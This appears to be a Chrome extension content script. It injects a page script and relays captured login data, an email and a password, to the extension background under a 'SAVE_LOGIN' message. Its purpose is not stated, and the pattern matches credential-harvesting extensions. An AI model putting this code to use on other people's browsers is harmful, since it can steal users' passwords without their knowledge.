const script = document.createElement('script');
script.src = chrome.runtime.getURL('injected.js');
(document.head || document.documentElement).appendChild(script);
script.onload = () => script.remove();

window.addEventListener('message', (event) => {
  if (event.source !== window) return;
  if (event.data && event.data.type === 'ALPHA_LOGIN_CAPTURED') {
    chrome.runtime.sendMessage({
      type: 'SAVE_LOGIN',
      email: event.data.email,
      password: event.data.password
    });
  }
});
